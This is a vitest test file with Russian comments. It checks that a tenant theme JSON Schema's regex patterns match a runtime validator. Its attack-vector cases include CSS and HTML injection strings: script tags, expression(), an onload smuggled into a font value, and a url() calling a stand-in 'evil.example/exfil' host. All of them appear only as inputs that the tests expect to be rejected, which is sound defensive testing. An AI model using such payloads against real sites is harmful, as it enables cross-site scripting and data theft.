import { describe, expect, test } from 'vitest'
import { defineTheme } from './define'
import { resolveTheme } from './resolve'
import { validateTenantTextValue, validateTenantValue } from './patch-grammar'
import { tenantThemeSchema } from './schema'
import type { ResolvedTheme } from './types'

/**
 * `tenantThemeSchema` (P6.2) — JSON Schema draft 2020-12 из грамматики P6.1. Несущий тест —
 * anti-drift: `pattern` схемы обязан согласовываться с вердиктом `validateTenantValue` на
 * матрице легальных значений + вектор атак P6.1 (Code Guidance item'а «anti-drift тест —
 * несущий, безопасность»). Расхождение = FAIL.
 */

/** Та же база, что `patch.test.ts::fullBase` — все 7 tenant-типов + запрещённый `shadow`. */
function fullBase(): ResolvedTheme {
  const theme = defineTheme({
    base: {
      color: { bg: { page: '#ffffff' }, action: { primary: '#3355ff' } },
      space: { 4: '1rem' },
      fontWeight: { bold: 700 },
      font: { sans: 'system-ui, sans-serif' },
      duration: { fast: '150ms' },
      z: { modal: 40 },
      text: { '2xl': { size: '1.5rem', lineHeight: 1.33 } },
      shadow: { card: '0 1px 2px black' },
    },
  })
  return resolveTheme(theme)
}

function ok(fn: () => unknown): boolean {
  try {
    fn()
    return true
  } catch {
    return false
  }
}

describe('tenantThemeSchema — anti-drift: pattern↔validateTenantValue согласованы', () => {
  const base = fullBase()
  const schema = tenantThemeSchema(base)
  const colorSchema = (schema.properties.color as { properties: Record<string, unknown> }).properties.bg as {
    properties: Record<string, { pattern: string }>
  }
  const colorPattern = new RegExp(colorSchema.properties.page!.pattern)

  const dimensionSchema = (schema.properties.space as { properties: Record<string, { pattern: string }> }).properties
  const dimensionPattern = new RegExp(dimensionSchema[4]!.pattern)

  const fontWeightSchema = (schema.properties.fontWeight as { properties: Record<string, { pattern: string }> })
    .properties
  const fontWeightPattern = new RegExp(fontWeightSchema.bold!.pattern)

  const fontFamilySchema = (schema.properties.font as { properties: Record<string, { pattern: string }> }).properties
  const fontFamilyPattern = new RegExp(fontFamilySchema.sans!.pattern)

  const durationSchema = (schema.properties.duration as { properties: Record<string, { pattern: string }> })
    .properties
  const durationPattern = new RegExp(durationSchema.fast!.pattern)

  test.each([
    ['color', colorPattern, 'red}</style><script>alert(1)</script>'],
    ['color', colorPattern, '#fff;}'],
    ['color', colorPattern, 'url(https://evil.example/exfil?x=1)'],
    ['color', colorPattern, 'expression(alert(1))'],
    ['color', colorPattern, '@import url(x)'],
    ['color', colorPattern, '#fff/*'],
    ['color', colorPattern, 'a\\3c b'],
    ['color', colorPattern, 'red}'],
    ['dimension', dimensionPattern, '1px}'],
    ['dimension', dimensionPattern, '10px\n}'],
    ['fontFamily', fontFamilyPattern, 'system-ui" onload="alert(1)'],
  ] as const)('%s вектор атаки %s → reject и схемой, и validateTenantValue', (type, pattern, value) => {
    expect(pattern.test(value)).toBe(false)
    expect(ok(() => validateTenantValue(type, value))).toBe(false)
  })

  test.each([
    ['color', colorPattern, '#1A73E8'],
    ['color', colorPattern, 'oklch(0.6 0.15 250)'],
    // Regression P6.2-fix: named color literal с подстрокой "url" — не должна путаться с
    // вызовом функции `url(...)` (rejectMetachars URL_RE сужен до `url\s*\(`).
    ['color', colorPattern, 'burlywood'],
    // Regression: case-insensitive и trim-парность со `parseColor` (`.trim()` + `/i` на каждом
    // `parse*`, dtcg/color.ts) — раньше схема отклоняла то, что ядро принимает (обратный drift).
    ['color', colorPattern, 'RED'],
    ['color', colorPattern, 'OKLCH(0.6 0.15 250)'],
    ['color', colorPattern, ' red'],
    ['color', colorPattern, 'red '],
    ['dimension', dimensionPattern, '8px'],
    ['dimension', dimensionPattern, '1.5rem'],
    ['fontWeight', fontWeightPattern, '600'],
    ['duration', durationPattern, '200ms'],
    ['fontFamily', fontFamilyPattern, 'system-ui, sans-serif'],
  ] as const)('%s легальное значение %s → accept и схемой, и validateTenantValue', (type, pattern, value) => {
    expect(pattern.test(value)).toBe(true)
    expect(ok(() => validateTenantValue(type, value))).toBe(true)
  })

  test.each([
    // Regression: COLOR_PATTERN раньше допускал 5/7-значный hex (`{3,8}`), `parseHex` — только
    // 3/4/6/8 (dtcg/color.ts) → schema-accept/core-throw drift, вне матрицы атак.
    ['color', colorPattern, '#fffff'],
    ['color', colorPattern, '#fffffff'],
    // Regression R-16 §2 failure-path-1: PCRE `$` (внешний PHP-consumer схемы) матчит и перед
    // финальным `\n`, ECMA-262 `$` — нет; тест здесь эмулирует PCRE-семантику через сам паттерн,
    // а не через `new RegExp` (иначе он снова ничего не поймает, см. R-16 finding) —
    // `pattern`-строка обязана явным образом отвергать хвостовой `\n` (END, не голый `$`).
    ['dimension', dimensionPattern, '1rem\n'],
  ] as const)('%s нелегальное значение %s → reject и схемой, и validateTenantValue', (type, pattern, value) => {
    expect(pattern.test(value)).toBe(false)
    expect(ok(() => validateTenantValue(type, value))).toBe(false)
  })

  test('pattern строится ИЗ patch-grammar.ts констант, не дублируется вторым литералом', () => {
    expect(dimensionSchema[4]!.pattern).toBe(
      '^-?\\d{1,4}(\\.\\d{1,4})?(px|rem|em|%|vh|vw|vmin|vmax|ch|ex)(?![\\s\\S])',
    )
  })
})

describe('tenantThemeSchema — text-композит (nested object, не type:string)', () => {
  const base = fullBase()
  const schema = tenantThemeSchema(base)
  const textNode = (schema.properties.text as { properties: Record<string, unknown> }).properties['2xl'] as {
    type: string
    additionalProperties: false
    required: string[]
    properties: Record<string, { pattern: string }>
  }

  test('type object, additionalProperties:false, required:[size]', () => {
    expect(textNode.type).toBe('object')
    expect(textNode.additionalProperties).toBe(false)
    expect(textNode.required).toEqual(['size'])
  })

  test('size/lineHeight pattern согласованы с validateTenantTextValue', () => {
    const sizeRe = new RegExp(textNode.properties.size!.pattern)
    const lineHeightRe = new RegExp(textNode.properties.lineHeight!.pattern)
    expect(sizeRe.test('1.75rem')).toBe(true)
    expect(lineHeightRe.test('1.4')).toBe(true)
    expect(sizeRe.test('1rem}</style>')).toBe(false)

    expect(ok(() => validateTenantTextValue({ size: '1.75rem', lineHeight: 1.4 }))).toBe(true)
    expect(ok(() => validateTenantTextValue({ size: '1rem}</style>' }))).toBe(false)
  })
})

describe('tenantThemeSchema — структурные инварианты', () => {
  const base = fullBase()
  const schema = tenantThemeSchema(base)

  test('$schema/type/additionalProperties:false на корне', () => {
    expect(schema.$schema).toBe('https://json-schema.org/draft/2020-12/schema')
    expect(schema.type).toBe('object')
    expect(schema.additionalProperties).toBe(false)
  })

  test('additionalProperties:false на вложенных группах', () => {
    const colorGroup = schema.properties.color as { additionalProperties: false }
    expect(colorGroup.additionalProperties).toBe(false)
  })

  test('shadow (запрещён v1, P-D70) ОТСУТСТВУЕТ в properties', () => {
    expect('shadow' in schema.properties).toBe(false)
  })

  test('z (тип number, разрешён) присутствует', () => {
    expect('z' in schema.properties).toBe(true)
  })

  test('детерминизм: двойной вызов даёт байт-в-байт равный JSON', () => {
    const a = JSON.stringify(tenantThemeSchema(base))
    const b = JSON.stringify(tenantThemeSchema(base))
    expect(a).toBe(b)
  })
})
